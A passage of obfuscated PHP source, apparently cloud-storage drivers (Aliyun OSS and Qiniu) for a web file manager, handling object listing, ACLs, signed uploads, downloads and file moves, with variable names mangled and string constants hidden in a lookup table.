$ƒ›­ù) { try { $this->client->deleteObjects($this->bucket, $ƒ›­ù); } catch (OSS\Core\OssException $Çüá·÷) { return !1; } } return !0; } public function rename($š°Ö¿ê , $´¼íõÙ¾) { return $this->renameObject($š°Ö¿ê , $´¼íõÙ¾); } private function fileInfo($ÎÒ²—ô, $ôóãÒ†ğ = false, $ÏàûÈì¬ = array()) { $ôÅªéúÊ =& $_SERVER[¤·²È‰º]; $õ¦ÑØÑö = array($ôÅªéúÊ[42] => $this->pathThis($ÎÒ²—ô), $ôÅªéúÊ[94] => $this->getPathOuter($ÎÒ²—ô), $ôÅªéúÊ[43] => $ôÅªéúÊ[209], $ôÅªéúÊ[86] => isset($ÏàûÈì¬[$ôÅªéúÊ[86]]) ? $ÏàûÈì¬[$ôÅªéúÊ[86]] : 0, $ôÅªéúÊ[184] => $this->ext($ÎÒ²—ô)); if ($ôóãÒ†ğ) { return $õ¦ÑØÑö; } $õ¦ÑØÑö[$ôÅªéúÊ[210]] = $õ¦ÑØÑö[$ôÅªéúÊ[95]] = 0; $õ¦ÑØÑö[$ôÅªéúÊ[211]] = $õ¦ÑØÑö[$ôÅªéúÊ[212]] = !0; if (empty($ÏàûÈì¬)) { $µÊüª¹‘ = $this->objectMeta($ÎÒ²—ô); if (!$µÊüª¹‘) { return $õ¦ÑØÑö; } $ÏàûÈì¬ = array($ôÅªéúÊ[95] => strtotime($µÊüª¹‘[$ôÅªéúÊ[1392]]), $ôÅªéúÊ[86] => $µÊüª¹‘[$ôÅªéúÊ[1391]] + 0); } if (isset($ÏàûÈì¬[$ôÅªéúÊ[86]])) { $õ¦ÑØÑö[$ôÅªéúÊ[86]] = $ÏàûÈì¬[$ôÅªéúÊ[86]]; } if (isset($ÏàûÈì¬[$ôÅªéúÊ[95]])) { $õ¦ÑØÑö[$ôÅªéúÊ[95]] = $ÏàûÈì¬[$ôÅªéúÊ[95]]; } if (isset($ÏàûÈì¬[$ôÅªéúÊ[213]]) && !trim($õ¦ÑØÑö[$ôÅªéúÊ[95]])) { $õ¦ÑØÑö[$ôÅªéúÊ[95]] = $ÏàûÈì¬[$ôÅªéúÊ[213]]; } return $õ¦ÑØÑö; } private function folderInfo($ÌÔ¢áé¾, $¬½°ñÀŸ = false, $¹ÂŞˆŸ = array()) { $Ä…ÄÖşÃ =& $_SERVER[¤·²È‰º]; $×Şğíñö = array($Ä…ÄÖşÃ[42] => $this->pathThis($ÌÔ¢áé¾), $Ä…ÄÖşÃ[94] => $this->getPathOuter($Ä…ÄÖşÃ[8] . $ÌÔ¢áé¾), $Ä…ÄÖşÃ[43] => $Ä…ÄÖşÃ[85]); if ($¬½°ñÀŸ) { return $×Şğíñö; } $×Şğíñö[$Ä…ÄÖşÃ[210]] = $×Şğíñö[$Ä…ÄÖşÃ[95]] = 0; $×Şğíñö[$Ä…ÄÖşÃ[211]] = $×Şğíñö[$Ä…ÄÖşÃ[212]] = !0; if (empty($¹ÂŞˆŸ)) { $ÌÔ¢áé¾ = rtrim($ÌÔ¢áé¾, $Ä…ÄÖşÃ[8]) . $Ä…ÄÖşÃ[8]; $èÅ„ôÑˆ = $this->objectMeta($ÌÔ¢áé¾); if (!$èÅ„ôÑˆ) { return $×Şğíñö; } $¹ÂŞˆŸ = array($Ä…ÄÖşÃ[210] => $èÅ„ôÑˆ[$Ä…ÄÖşÃ[519]][$Ä…ÄÖşÃ[1399]], $Ä…ÄÖşÃ[95] => strtotime($èÅ„ôÑˆ[$Ä…ÄÖşÃ[1392]])); } if (isset($¹ÂŞˆŸ[$Ä…ÄÖşÃ[95]])) { $×Şğíñö[$Ä…ÄÖşÃ[95]] = $¹ÂŞˆŸ[$Ä…ÄÖşÃ[95]]; } if (isset($¹ÂŞˆŸ[$Ä…ÄÖşÃ[210]])) { $×Şğíñö[$Ä…ÄÖşÃ[210]] = $¹ÂŞˆŸ[$Ä…ÄÖşÃ[210]]; } return $×Şğíñö; } public function listPath($üì¹¢ª, $¼÷ìÑø = false) { $ê«†ÙÔù =& $_SERVER[¤·²È‰º]; $£©„ÙÈ = $this->fileList($üì¹¢ª, $ê«†ÙÔù[8], !0); foreach ($£©„ÙÈ[$ê«†ÙÔù[92]] as $Úü¥Óºó => $Ñ³á²³¸) { $£©„ÙÈ[$ê«†ÙÔù[92]][$Úü¥Óºó] = $this->folderInfo($Ñ³á²³¸, $¼÷ìÑø, $Ñ³á²³¸); } foreach ($£©„ÙÈ[$ê«†ÙÔù[93]] as $Úü¥Óºó => $Ñ³á²³¸) { $£©„ÙÈ[$ê«†ÙÔù[93]][$Úü¥Óºó] = $this->fileInfo($Ñ³á²³¸[$ê«†ÙÔù[42]], $¼÷ìÑø, $Ñ³á²³¸); } return $£©„ÙÈ; } protected function infoChildren($­Ò¹Ã×ß, &$³§Òš‰á) { $š¶´³·² =& $_SERVER[¤·²È‰º]; $Òñ¸„¡’ = $this->fileList($­Ò¹Ã×ß, $š¶´³·²[12], !0); $³§Òš‰á[$š¶´³·²[88]] += count($Òñ¸„¡’[$š¶´³·²[92]]); $³§Òš‰á[$š¶´³·²[87]] += count($Òñ¸„¡’[$š¶´³·²[93]]); foreach ($Òñ¸„¡’[$š¶´³·²[93]] as $ĞÊ«¦ø˜) { if (!$ĞÊ«¦ø˜ || !$ĞÊ«¦ø˜[$š¶´³·²[86]]) { continue; } $³§Òš‰á[$š¶´³·²[86]] += $ĞÊ«¦ø˜[$š¶´³·²[86]]; } } public function has($ä²‹ª†, $ÎËæ€¦³ = false, $ÓÖÜª = true) { $¥ô§ış =& $_SERVER[¤·²È‰º]; $ä²‹ª† = trim($ä²‹ª†, $¥ô§ış[8]); $™›½›Çí = empty($ä²‹ª†) && $ä²‹ª† !== $¥ô§ış[207] ? $¥ô§ış[12] : $ä²‹ª† . $¥ô§ış[8]; $„ÙÄ€Ãë = $¥ô§ış[12]; $õ¥•Ì¢Ã = 500; $‹Ú£‡ø = $¹¾£Çœ = 0; while (!0) { check_abort(); $Ñ¸¼¯è = array($¥ô§ış[1387] => $¥ô§ış[8], $¥ô§ış[1388] => $™›½›Çí, $¥ô§ış[1389] => $õ¥•Ì¢Ã, $¥ô§ış[1390] => $„ÙÄ€Ãë); try { $ßö¡Æë­ = $this->client->listObjects($this->bucket, $Ñ¸¼¯è); } catch (OSS\Core\OssException $µŸÜò‡) { break; } $„ÙÄ€Ãë = $ßö¡Æë­->getNextMarker(); $ÇˆÚè±¾ = $ßö¡Æë­->getObjectList(); $©÷õã¨ß = $ßö¡Æë­->getPrefixList(); if ($ÎËæ€¦³) { if (count($ÇˆÚè±¾) > 1 || count($ÇˆÚè±¾) == 1 && $ÇˆÚè±¾[0]->getKey() != $™›½›Çí) { $‹Ú£‡ø += count($ÇˆÚè±¾) - 1; } if (!empty($©÷õã¨ß)) { $¹¾£Çœ += count($©÷õã¨ß); } if ($„ÙÄ€Ãë === $¥ô§ış[12]) { break; } continue; } if ($ÓÖÜª) { if (!empty($ÇˆÚè±¾)) { if (count($ÇˆÚè±¾) > 1 || $ÇˆÚè±¾[0]->getKey() != $™›½›Çí) { return !0; } } } else { if (!empty($©÷õã¨ß)) { return !0; } } if ($„ÙÄ€Ãë === $¥ô§ış[12]) { break; } } if ($ÎËæ€¦³) { return array($¥ô§ış[217] => $‹Ú£‡ø, $¥ô§ış[218] => $¹¾£Çœ); } return !1; } public function listAll($„šÑƒŸ) { $Ğœğ¯Óä =& $_SERVER[¤·²È‰º]; $­î²·ığ = $this->fileList($„šÑƒŸ, $Ğœğ¯Óä[12], !0); $€²ç†Ü‹ = array(); foreach ($­î²·ığ[$Ğœğ¯Óä[93]] as $“äüôé«) { $€²ç†Ü‹[$“äüôé«[$Ğœğ¯Óä[42]]] = $“äüôé«[$Ğœğ¯Óä[86]]; } foreach ($­î²·ığ[$Ğœğ¯Óä[92]] as $“äüôé«) { if (is_string($“äüôé«)) { $€²ç†Ü‹[$“äüôé«] = 0; } } return $this->listAllFiles($„šÑƒŸ, array_keys($€²ç†Ü‹), $€²ç†Ü‹); } public function canRead($ÛŠÁà˜Ç) { $Şµ©¨…ë =& $_SERVER[¤·²È‰º]; $ûËŒ”ç™ = $this->pathAcl($ÛŠÁà˜Ç); return $ûËŒ”ç™ == $Şµ©¨…ë[1400] || $ûËŒ”ç™ == $Şµ©¨…ë[564] ? !0 : !1; } public function canWrite($şáÇÎî) { $¬É¸Ç¸à = $this->pathAcl($şáÇÎî); return $¬É¸Ç¸à == $_SERVER[¤·²È‰º][564] ? !0 : !1; } public function pathAcl($´†âæó—) { $¸Ã™ÜœÃ =& $_SERVER[¤·²È‰º]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $æ²¥ÅÂó = $this->client->getObjectAcl($this->bucket, $this->pathEncode($´†âæó—)); } catch (OSS\Core\OssException $ˆÁö·˜‡) { return !1; } $È·ƒÔÏ› = $æ²¥ÅÂó == $¸Ã™ÜœÃ[47] ? $this->bucketAcl : $æ²¥ÅÂó; if ($È·ƒÔÏ› == $¸Ã™ÜœÃ[1401]) { return $¸Ã™ÜœÃ[1400]; } if ($È·ƒÔÏ› == $¸Ã™ÜœÃ[1402]) { return $¸Ã™ÜœÃ[564]; } return $È·ƒÔÏ›; } private function chmodPath($”ë¶İÖî, $¶¾á¥°È = '') { $öÎ¯¾à =& $_SERVER[¤·²È‰º]; $…Õ·÷Ì = empty($¶¾á¥°È) ? $öÎ¯¾à[1402] : $¶¾á¥°È; $Ñó»óªì = array($öÎ¯¾à[47], $öÎ¯¾à[208], $öÎ¯¾à[1401], $öÎ¯¾à[1402]); if (!in_array($…Õ·÷Ì, $Ñó»óªì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($”ë¶İÖî), $…Õ·÷Ì); } catch (OSS\Core\OssException $Ùö´™İ€) { return !1; } return !0; } public function getContent($ı”Ù¥€à) { return $this->fileSubstr($ı”Ù¥€à, -1); } public function setContent($İìĞ§©æ, $Š€ª¢ › = '') { $£ûĞ÷áÜ =& $_SERVER[¤·²È‰º]; try { $†¿Áù× = $this->trafficLimit($£ûĞ÷áÜ[1403]); $ê°ı£Ë– = $this->client->putObject($this->bucket, $this->pathEncode($İìĞ§©æ), $Š€ª¢ ›, $†¿Áù×); } catch (OSS\Core\OssException $Õôä¸åÌ) { return !1; } $‰æßöìÎ = array($£ûĞ÷áÜ[1393] => trim($ê°ı£Ë–[$£ûĞ÷áÜ[1404]], $£ûĞ÷áÜ[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($İìĞ§©æ))); $this->updateObjMeta($İìĞ§©æ, $‰æßöìÎ); return isset($ê°ı£Ë–[$£ûĞ÷áÜ[1405]][$£ûĞ÷áÜ[1352]]) ? !0 : !1; } private function updateObjMeta($§Ù °†¨, $ªºìÁç) { $§Ù °†¨ = $this->pathEncode($§Ù °†¨); try { $¦ô™ä¸ = array(OSS\OssClient::OSS_HEADERS => $ªºìÁç); $this->client->copyObject($this->bucket, $§Ù °†¨, $this->bucket, $§Ù °†¨, $¦ô™ä¸); } catch (OSS\Core\OssException $Åô¦¨³) { return !1; } return !0; } public function upload($€İ¼¶ıì, $ü¥Ğ–Âß, $Üª¿¤ = false, $­’¥ïï± = REPEAT_REPLACE) { $¼ÔØ‹¨Æ =& $_SERVER[¤·²È‰º]; $‹Øñ†ÄË = trim($€İ¼¶ıì, $¼ÔØ‹¨Æ[8]); $³¯èš÷ƒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¼ÔØ‹¨Æ[1393] => @md5_file($ü¥Ğ–Âß)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($€İ¼¶ıì))); $³¯èš÷ƒ = $this->trafficLimit($¼ÔØ‹¨Æ[1403], $³¯èš÷ƒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‹Øñ†ÄË), $ü¥Ğ–Âß, $³¯èš÷ƒ); } catch (OSS\Core\OssException $ß”ù¿øŸ) { return !1; } return $this->getPathOuter($€İ¼¶ıì); } public function getHost() { $§¡õÖ™¾ =& $_SERVER[¤·²È‰º]; $º®¦‰è‚ = explode($§¡õÖ™¾[193], parent::getHost()); return $º®¦‰è‚[0] . $§¡õÖ™¾[193] . $this->bucket . $§¡õÖ™¾[10] . $º®¦‰è‚[1]; } public function uploadFormData($ÙŒÒ Õë, $ÍŒû‡×ó = 3600) { $ª“æ’” =& $_SERVER[¤·²È‰º]; if (!($é»…û“£ = $this->getHost())) { return !1; } $ï»£×«± = $ÍŒû‡×ó; $ô…ƒÂ¶¦ = date($ª“æ’”[1406], time() + $ï»£×«±); $ˆ­Ø‡§â = new DateTime($ô…ƒÂ¶¦); $¤î®Ú› = $ˆ­Ø‡§â->format(DateTime::ISO8601); $ôú¶çêÜ = strpos($¤î®Ú›, $ª“æ’”[305]); $¤î®Ú› = substr($¤î®Ú›, 0, $ôú¶çêÜ) . $ª“æ’”[1407]; $ÓÆ Ìú® = 1048576000 * 5; $Êü½Í·œ = $this->pathFather($ÙŒÒ Õë); $ÊÃ§˜£ó = array($ª“æ’”[1306] => $¤î®Ú›, $ª“æ’”[1307] => array(array($ª“æ’”[1408], 0, $ÓÆ Ìú®), array($ª“æ’”[1310], $ª“æ’”[1311], $Êü½Í·œ))); $ÆÑ½›»‹ = base64_encode(json_encode($ÊÃ§˜£ó)); $¡è¡–Òì = base64_encode(hash_hmac($ª“æ’”[241], $ÆÑ½›»‹, $this->secret, !0)); $è­ëÛ› = array($ª“æ’”[1316] => $ÆÑ½›»‹, $ª“æ’”[1409] => $this->accessKey, $ª“æ’”[1312] => $ª“æ’”[1304], $ª“æ’”[1410] => $¡è¡–Òì, $ª“æ’”[191] => $é»…û“£); $è­ëÛ› = $this->trafficLimit($ª“æ’”[1403], $è­ëÛ›); return $è­ëÛ›; } public function multiUploadFormData($ŠŒÊô, $÷’³Ô‰è = 3600) { $Õ³©¬ Ï =& $_SERVER[¤·²È‰º]; if (!($ìÂÈ…Şû = $this->getHost())) { return !1; } $Áƒ±áÖ¹ = $this->trafficLimit($Õ³©¬ Ï[1403]); $Ç¯ÒØ°ø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŠŒÊô), $Áƒ±áÖ¹); return array($Õ³©¬ Ï[233] => $Ç¯ÒØ°ø, $Õ³©¬ Ï[191] => $ìÂÈ…Şû . $Õ³©¬ Ï[8] . $this->pathEncode($ŠŒÊô), $Õ³©¬ Ï[234] => gmdate($Õ³©¬ Ï[1411]), $Õ³©¬ Ï[104] => $ŠŒÊô); } public function multiUploadAuthData($Å¾†ØáÖ, $ö ©ö“ù = array()) { $Š›íÇ¤ƒ =& $_SERVER[¤·²È‰º]; $ãê…ÖŠÛ = isset($ö ©ö“ù[$Š›íÇ¤ƒ[234]]) ? $ö ©ö“ù[$Š›íÇ¤ƒ[234]] : gmdate($Š›íÇ¤ƒ[1411]); $ˆ£ñ–¼ì = isset($ö ©ö“ù[$Š›íÇ¤ƒ[184]]) ? $ö ©ö“ù[$Š›íÇ¤ƒ[184]] : $Š›íÇ¤ƒ[12]; $ë×Ùá‹ = $Å¾†ØáÖ; if (isset($ö ©ö“ù[$Š›íÇ¤ƒ[104]])) { $ë×Ùá‹ = $ö ©ö“ù[$Š›íÇ¤ƒ[104]]; unset($ö ©ö“ù[$Š›íÇ¤ƒ[104]]); } if (isset($ö ©ö“ù[$Š›íÇ¤ƒ[235]])) { $ö ©ö“ù[$Š›íÇ¤ƒ[234]] = $ãê…ÖŠÛ; return $this->listUploadParts($ë×Ùá‹, $ö ©ö“ù); } $øşÄ‡ª† = array($Š›íÇ¤ƒ[236], $Š›íÇ¤ƒ[12], $Š›íÇ¤ƒ[130], $ãê…ÖŠÛ, "\170\x2d\157\x73\x73\55\144\141\164\145\x3a{$ãê…ÖŠÛ}", $Š›íÇ¤ƒ[8] . $this->bucket . $Š›íÇ¤ƒ[8] . $ë×Ùá‹ . $ˆ£ñ–¼ì); if (strpos($ˆ£ñ–¼ì, $Š›íÇ¤ƒ[237]) === 0) { $øşÄ‡ª†[0] = $Š›íÇ¤ƒ[238]; if ($î½àØˆ = $this->trafficLimit($Š›íÇ¤ƒ[1403])) { $ë×Ùá‹ = $Š›íÇ¤ƒ[1412]; array_splice($øşÄ‡ª†, 5, 0, $ë×Ùá‹ . $Š›íÇ¤ƒ[4] . $î½àØˆ[$ë×Ùá‹]); } } if (isset($ö ©ö“ù[$Š›íÇ¤ƒ[239]]) && $ö ©ö“ù[$Š›íÇ¤ƒ[239]] == $Š›íÇ¤ƒ[240]) { $øşÄ‡ª†[0] = $Š›íÇ¤ƒ[240]; } if (!empty($ö ©ö“ù[$Š›íÇ¤ƒ[1413]])) { $‚İ¦çÙ = array_merge(array($øşÄ‡ª†[4]), $ö ©ö“ù[$Š›íÇ¤ƒ[1413]]); sort($‚İ¦çÙ); $øşÄ‡ª†[4] = implode($Š›íÇ¤ƒ[18], $‚İ¦çÙ); } $Æº„´ÁŸ = implode($Š›íÇ¤ƒ[18], $øşÄ‡ª†); $ùÒß¯­ = base64_encode(hash_hmac($Š›íÇ¤ƒ[241], $Æº„´ÁŸ, $this->secret, !0)); $Ìõ¹î•é = $Š›íÇ¤ƒ[1377] . $this->accessKey . $Š›íÇ¤ƒ[4] . $ùÒß¯­; if (strpos($ˆ£ñ–¼ì, $Š›íÇ¤ƒ[237]) === 0) { $Ìõ¹î•é = array($Š›íÇ¤ƒ[243] => $Ìõ¹î•é, $Š›íÇ¤ƒ[234] => $ãê…ÖŠÛ); if ($î½àØˆ) { $Ìõ¹î•é = array_merge($Ìõ¹î•é, $î½àØˆ); } } return $Ìõ¹î•é; } public function listUploadParts($˜é­ıĞ, $Ø ¾Áøä) { $Å¹¯šÃ¯ =& $_SERVER[¤·²È‰º]; $¤ÄÀ©µ = parse_url_query($Ø ¾Áøä[$Å¹¯šÃ¯[184]]); $´µ­ƒÌ = $this->client->listParts($this->bucket, $this->pathEncode($˜é­ıĞ), $¤ÄÀ©µ[$Å¹¯šÃ¯[233]]); $à“ËÕĞß = $´µ­ƒÌ->getListPart(); $¢Òƒë°Œ = array(); foreach ($à“ËÕĞß as $´Ã¹Š) { $¢Òƒë°Œ[] = array($Å¹¯šÃ¯[1397] => $´Ã¹Š->getPartNumber(), $Å¹¯šÃ¯[1398] => trim($´Ã¹Š->getETag(), $Å¹¯šÃ¯[128])); } unset($Ø ¾Áøä[$Å¹¯šÃ¯[235]], $Ø ¾Áøä[$Å¹¯šÃ¯[239]]); $áµêÇ¿Î = $this->multiUploadAuthData($˜é­ıĞ, $Ø ¾Áøä); if (empty($áµêÇ¿Î)) { return !1; } return array($Å¹¯šÃ¯[243] => $áµêÇ¿Î, $Å¹¯šÃ¯[234] => $Ø ¾Áøä[$Å¹¯šÃ¯[234]], $Å¹¯šÃ¯[245] => $¢Òƒë°Œ); } public function download($½İ÷÷ƒ—, $ª€üâœŒ) { if ($this->isFolder($½İ÷÷ƒ—)) { return !1; } try { $Äû¿ã±İ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ª€üâœŒ); $Äû¿ã±İ = $this->trafficLimit($_SERVER[¤·²È‰º][119], $Äû¿ã±İ); $this->client->getObject($this->bucket, $this->pathEncode($½İ÷÷ƒ—), $Äû¿ã±İ); } catch (OSS\Core\OssException $ìÏ™£Œ­) { return !1; } return $ª€üâœŒ; } public function fileSubstr($­¡¶÷Åé, $œú¡Ù—ô = 0, $òÇ€ş• = false) { if ($œú¡Ù—ô === -1) { $’µñ¬«¡ = array(); } else { if ($òÇ€ş• === !1) { $×šÚÔõ² = $this->size($­¡¶÷Åé); } else { $×šÚÔõ² = $œú¡Ù—ô + $òÇ€ş• - 1; } $’µñ¬«¡ = array(OSS\OssClient::OSS_RANGE => "{$œú¡Ù—ô}\x2d{$×šÚÔõ²}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($­¡¶÷Åé), $’µñ¬«¡); } catch (OSS\Core\OssException $˜·ª“­¹) { think_exception($˜·ª“­¹->getMessage()); return !1; } } private function trafficLimit($’ÚıŸ™¥, $Ğ˜†Õºú = array()) { $¿ïŒ¿Ô± =& $_SERVER[¤·²È‰º]; if ($’ÚıŸ™¥ == $¿ïŒ¿Ô±[1403] && $this->isUploadServer() || $’ÚıŸ™¥ == $¿ïŒ¿Ô±[119] && $this->isFileOutServer()) { return $Ğ˜†Õºú; } $äÙã»¹„ = floatval($GLOBALS[$¿ïŒ¿Ô±[6]][$¿ïŒ¿Ô±[99]][$¿ïŒ¿Ô±[117]][$’ÚıŸ™¥]) * 1024 * 1024 * 8; if (!$äÙã»¹„) { return $Ğ˜†Õºú; } $äÙã»¹„ = $äÙã»¹„ < 819200 ? 819200 : ($äÙã»¹„ > 838860800 ? 838860800 : $äÙã»¹„); $Ğ˜†Õºú[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($äÙã»¹„); return $Ğ˜†Õºú; } public function link($óó–ççƒ, $ã³à”å¬ = array()) { $ÕÄÏŠÎİ =& $_SERVER[¤·²È‰º]; if (!$this->exist($óó–ççƒ) || $this->isFolder($óó–ççƒ)) { return !1; } try { $ã³à”å¬ = $this->trafficLimit($ÕÄÏŠÎİ[119], $ã³à”å¬); $óãÕÂêå = $this->client->signUrl($this->bucket, $this->pathEncode($óó–ççƒ), 3600 * 12, $ÕÄÏŠÎİ[240], $ã³à”å¬); return $this->getCdnLink($óãÕÂêå); } catch (OSS\Core\OssException $©ËºîàÁ) { return !1; } } public function fileOut($“ÕÓµŸ€, $Êìş†Ùœ = false, $¯éœ‚ßÙ = false, $ò±À½¹§ = '') { $‹ãÊ˜»‚ =& $_SERVER[¤·²È‰º]; if ($this->isFileOutServer()) { return $this->fileOutServer($“ÕÓµŸ€, $Êìş†Ùœ, $¯éœ‚ßÙ, $ò±À½¹§); } if (!$¯éœ‚ßÙ) { $¯éœ‚ßÙ = $this->pathThis($“ÕÓµŸ€); } $¯éœ‚ßÙ = rawurlencode($¯éœ‚ßÙ); $àÌêÍœ = get_file_mime(get_path_ext($¯éœ‚ßÙ)); if ($àÌêÍœ == $‹ãÊ˜»‚[227]) { return parent::fileOut($“ÕÓµŸ€, $Êìş†Ùœ, $¯éœ‚ßÙ, $ò±À½¹§); } $Êìş†Ùœ = $Êìş†Ùœ ? $‹ãÊ˜»‚[1414] : $‹ãÊ˜»‚[1415]; $îş¹ø © = array(OSS\OssClient::OSS_SUB_RESOURCE => $‹ãÊ˜»‚[1416] . rawurlencode("{$Êìş†Ùœ}\x3b\x66\151\x6c\145\x6e\x61\155\145\x3d{$¯éœ‚ßÙ}")); $îş¹ø ©[OSS\OssClient::OSS_SUB_RESOURCE] .= $‹ãÊ˜»‚[1417] . rawurlencode($àÌêÍœ); $éØ©¸İä = $this->link($“ÕÓµŸ€, $îş¹ø ©); $this->fileOutLink($éØ©¸İä); } public function fileOutServer($º½Âñ·³, $ïİ€õüÂ = false, $è¥ôî’ = false, $øùøãîÇ = '') { parent::fileOut($º½Âñ·³, $ïİ€õüÂ, $è¥ôî’, $øùøãîÇ); } public function fileOutImage($öÈ¦°Ï», $Â¹ŠËñ = 250) { $Ú¡íÄøõ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¤·²È‰º][1418] . $Â¹ŠËñ); $õ‹¥‘¥ = $this->link($öÈ¦°Ï», $Ú¡íÄøõ); $this->fileOutLink($õ‹¥‘¥); } public function fileOutImageServer($‚½í”ó, $·ŸŒòÎú = 250) { parent::fileOutImage($‚½í”ó, $·ŸŒòÎú); } public function fileOutLink($¢ÎÂæÜŒ) { $é¬×¸¿À =& $_SERVER[¤·²È‰º]; if (!$this->isCdnHost() && substr($¢ÎÂæÜŒ, 0, 7) == $é¬×¸¿À[1319]) { $¢ÎÂæÜŒ = $é¬×¸¿À[1320] . substr($¢ÎÂæÜŒ, 7); } header($é¬×¸¿À[171] . $¢ÎÂæÜŒ); die; } public function hashMd5($°ˆ‚•‘‚, $¹„È—“ç = '') { $¿‹ÅÕ™Š =& $_SERVER[¤·²È‰º]; $åáù¤«± = $this->_objectMeta($°ˆ‚•‘‚); if (!$åáù¤«±) { return $¿‹ÅÕ™Š[12]; } if (!isset($åáù¤«±[$¿‹ÅÕ™Š[1393]]) && !empty($¹„È—“ç)) { $•Ó„µÕ§ = $this->updateObjMeta($°ˆ‚•‘‚, array($¿‹ÅÕ™Š[1393] => $¹„È—“ç)); $åáù¤«±[$¿‹ÅÕ™Š[1393]] = $•Ó„µÕ§ ? $¹„È—“ç : $¿‹ÅÕ™Š[12]; } return isset($åáù¤«±[$¿‹ÅÕ™Š[1393]]) ? strtolower($åáù¤«±[$¿‹ÅÕ™Š[1393]]) : $¿‹ÅÕ™Š[12]; } public function size($–êšÕÌ) { $±÷ˆóğ˜ = $this->objectMeta($–êšÕÌ); return $±÷ˆóğ˜ ? $±÷ˆóğ˜[$_SERVER[¤·²È‰º][86]] : 0; } public function info($„ÅÇğªß) { if ($this->isFolder($„ÅÇğªß)) { return $this->folderInfo($„ÅÇğªß); } else { if ($this->isFile($„ÅÇğªß)) { return $this->fileInfo($„ÅÇğªß); } } return !1; } public function exist($´…Ó´û) { return $this->isFile($´…Ó´û) || $this->isFolder($´…Ó´û); } public function isFile($–ğ ®òÏ) { return !$this->isFolder($–ğ ®òÏ) && $this->objectMeta($–ğ ®òÏ); } public function isFolder($ñÁà…©è) { return $this->cacheMethod($_SERVER[¤·²È‰º][175], $ñÁà…©è); } protected function objectMeta($¿òÉ²ÏŞ) { return $this->cacheMethod($_SERVER[¤·²È‰º][177], $¿òÉ²ÏŞ); } protected function _objectMeta($è­›—ğ) { $—‡ğ·–‘ =& $_SERVER[¤·²È‰º]; try { $÷ñËüªÔ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($è­›—ğ)); } catch (OSS\Core\OssException $Ù¶İš—„) { $÷ñËüªÔ = !1; } if ($÷ñËüªÔ) { $÷ñËüªÔ[$—‡ğ·–‘[86]] = intval($÷ñËüªÔ[$—‡ğ·–‘[1391]]); } return $÷ñËüªÔ; } protected function _isFolder($ŸäòÅ©¹) { $¶ƒ¬Óµİ =& $_SERVER[¤·²È‰º]; if ($ŸäòÅ©¹ == $¶ƒ¬Óµİ[12] || $ŸäòÅ©¹ == $¶ƒ¬Óµİ[8]) { return !0; } $êßÚÃğ = array($¶ƒ¬Óµİ[1387] => $¶ƒ¬Óµİ[8], $¶ƒ¬Óµİ[1388] => rtrim($ŸäòÅ©¹, $¶ƒ¬Óµİ[8]) . $¶ƒ¬Óµİ[8], $¶ƒ¬Óµİ[1389] => 1, $¶ƒ¬Óµİ[1390] => $¶ƒ¬Óµİ[12]); $ç¡ï¿°Õ = $this->client->listObjects($this->bucket, $êßÚÃğ); if ($ç¡ï¿°Õ->getObjectList() || $ç¡ï¿°Õ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($¶òÏ»û°) { parent::__construct(); require_once SDK_DIR . $_SERVER[¤·²È‰º][1419]; $this->_init($¶òÏ»û°); } public function _init($¤ÂÊ¸×š) { $ä¨¶ŒîÕ =& $_SERVER[¤·²È‰º]; foreach ($¤ÂÊ¸×š as $çŠû»ÃØ => $óççøûı) { if (isset($this->{$çŠû»ÃØ})) { $this->{$çŠû»ÃØ} = $óççøûı; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ä¨¶ŒîÕ[1420] . LNG($ä¨¶ŒîÕ[1378])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($·ÔÂ”›ó, $¯Å’­æ = '', $·è©°Ëö = REPEAT_RENAME) { if ($this->setContent($·ÔÂ”›ó, $¯Å’­æ)) { return $this->getPathOuter($·ÔÂ”›ó); } return !1; } public function mkdir($•‘ÙéØÜ, $â²²Œ•Å = REPEAT_SKIP) { $ÊöÑ¡”¤ =& $_SERVER[¤·²È‰º]; $ÛËæıõĞ = trim($•‘ÙéØÜ, $ÊöÑ¡”¤[8]); if ($this->_isFolder($ÛËæıõĞ)) { return $this->getPathOuter($ÛËæıõĞ); } $•‘ÙéØÜ = $ÛËæıõĞ . $ÊöÑ¡”¤[8]; $¯úŸ¹Æ« = get_path_this($ÛËæıõĞ); $¡’š¢¨ = $•‘ÙéØÜ . $¯úŸ¹Æ«; if (!$this->mkfile($¡’š¢¨)) { return !1; } if (!$this->moveFile($¡’š¢¨, $•‘ÙéØÜ)) { $this->delFile($¡’š¢¨); return !1; } return $this->getPathOuter($ÛËæıõĞ); } public function copyFile($ùıë²ñ, $÷şÁÜ˜Ò) { $±Ùù‡à = $this->bucketManager->copy($this->bucket, $ùıë²ñ, $this->bucket, $÷şÁÜ˜Ò, !0); return $±Ùù‡à ? !1 : $this->getPathOuter($÷şÁÜ˜Ò); } public function moveFile($ÕÆ‡ÆÉø, $§«„°™¡) { $˜òüò²Ø = $this->bucketManager->move($this->bucket, $ÕÆ‡ÆÉø, $this->bucket, $§«„°™¡, !0); return $˜òüò²Ø ? !1 : $this->getPathOuter($§«„°™¡); } public function delFile($¦Æ¸À“) { if (!$this->exist($¦Æ¸À“)) { return !0; } 